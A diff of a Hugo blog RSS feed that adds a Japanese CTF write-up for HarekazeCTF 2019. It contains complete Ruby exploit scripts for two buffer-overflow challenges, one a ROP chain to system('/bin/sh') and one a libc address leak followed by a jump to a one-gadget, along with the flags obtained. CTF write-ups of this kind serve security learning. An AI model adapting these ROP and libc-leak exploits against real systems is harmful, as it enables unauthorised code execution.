@@ -80,8 +80,99 @@
     <description>Recent content in Posts on $ make life</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 18 May 2019 12:24:26 +0900</lastBuildDate>
+    <lastBuildDate>Sun, 19 May 2019 16:54:53 +0900</lastBuildDate>
     <atom:link href="https://owlinux1000.github.io/blog/post/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Harekazectf2019</title>
+      <link>https://owlinux1000.github.io/blog/post/harekazectf2019/</link>
+      <pubDate>Sun, 19 May 2019 16:54:53 +0900</pubDate>
+      <guid>https://owlinux1000.github.io/blog/post/harekazectf2019/</guid>
+      <description>
+
+&lt;h2 id=&#34;baby-rop-1&#34;&gt;Baby ROP 1&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;バイナリ中で、&lt;code&gt;system&lt;/code&gt; 関数使ってechoしており、Canary等もないBOFが起こるので、&lt;code&gt;pop rdi; ret&lt;/code&gt; 使って&lt;code&gt;system(/bin/sh)&lt;/code&gt; を呼ぶだけ
+```ruby
+#!/usr/bin/env ruby&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;require &amp;lsquo;pwn&amp;rsquo;&lt;/p&gt;
+
+&lt;p&gt;context.log_level = :debug
+z = Sock.new &amp;ldquo;problem.harekaze.com&amp;rdquo;, 20001&lt;/p&gt;
+
+&lt;p&gt;pop_rdi_ret = p64(0x00400683)
+system = p64(0x4005e3)&lt;/p&gt;
+
+&lt;p&gt;STDIN.gets
+z.recvuntil &amp;ldquo;? &amp;ldquo;
+payload = &amp;ldquo;A&amp;rdquo; * 24
+payload &amp;lt;&amp;lt; pop_rdi_ret
+payload &amp;lt;&amp;lt; p64(0x601048)
+payload &amp;lt;&amp;lt; system&lt;/p&gt;
+
+&lt;p&gt;z.sendline payload&lt;/p&gt;
+
+&lt;p&gt;z.interact&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;- **HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}**
+
+## Baby ROP 2
+
+- `system` 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ
+```ruby
+#!/usr/bin/env ruby
+
+require &amp;#39;pwn&amp;#39;
+
+context.log_level = :debug
+z = Sock.new &amp;#34;problem.harekaze.com&amp;#34;, 20005
+#z = Sock.new &amp;#34;localhost&amp;#34;, 9999
+elf = ELF.new &amp;#34;./babyrop2&amp;#34;
+libc = ELF.new &amp;#34;./libc.so.6&amp;#34;
+#libc = ELF.new &amp;#34;./mylibc.so.6&amp;#34;
+
+pop_rdi_ret = p64(0x00400733)
+z.recvuntil &amp;#34;? &amp;#34;
+
+payload = &amp;#34;A&amp;#34; * 40
+payload &amp;lt;&amp;lt; pop_rdi_ret
+payload &amp;lt;&amp;lt; p64(elf.got[&amp;#34;__libc_start_main&amp;#34;])
+payload &amp;lt;&amp;lt; p64(0x4004f0)
+payload &amp;lt;&amp;lt; p64(elf.symbols[&amp;#34;main&amp;#34;])
+STDIN.gets
+z.sendline payload
+
+recvlen = &amp;#34;Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\n&amp;#34;.length
+data = z.recvuntil &amp;#34;? &amp;#34;
+p data
+libc_base = u64(data[recvlen, 6].ljust(8, &amp;#34;\x00&amp;#34;)) - libc.symbols[&amp;#34;__libc_start_main&amp;#34;]
+libc_magic = libc_base + 0xf02a4
+puts &amp;#34;libc base 0x%x&amp;#34; % libc_base
+puts &amp;#34;libc magic 0x%x&amp;#34; % libc_magic
+
+payload = &amp;#34;B&amp;#34; * 40
+payload &amp;lt;&amp;lt; p64(libc_magic)
+z.sendline payload
+
+z.interact&lt;/pre&gt;&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;login&#34;&gt;Login&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;解けなかった、脆弱性わからず&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;harekaze-note&#34;&gt;Harekaze Note&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Note の削除時に何も考慮してないため、Heapアドレスのリークやdouble freeができるが、そこから攻撃に繋げられず&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
     <item>
       <title>Terraform でConoha のインスタンスを立ててみる</title>
       <link>https://owlinux1000.github.io/blog/post/terraform_for_conoha/</link>
